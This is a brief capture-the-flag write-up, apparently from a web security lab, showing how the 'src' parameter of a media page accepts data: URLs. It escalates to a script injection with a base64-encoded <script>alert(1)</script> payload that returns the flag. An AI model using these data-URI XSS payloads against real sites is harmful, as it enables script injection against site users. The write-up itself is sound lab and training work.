# XSS media


## Attack scenario

in this page http://10.11.43.99/?page=media&src=nsa

We got another xss

first paylaod

> http://adressip/?page=media&src=data:text/plain,HELLO

Its working now lets try with html

> http://adressip/?page=media&src=data:text/html,<script>alert(1)</script>

Its working but it doesnt give us the flag, lets try to decode it

> http://adressip/?page=media&src=data:text/html;base64,ICA8c2NyaXB0PiBhbGVydCgxKTwvc2NyaXB0PiAg

> ICA8c2NyaXB0PiBhbGVydCgxKTwvc2NyaXB0PiAg is <script>alert(1)</script> with spaces to get rid of the == or + at the end of the decoded version in base64

and we get the flag

[source](https://developer.mozilla.org/fr/docs/web/http/basics_of_http/data_urls)
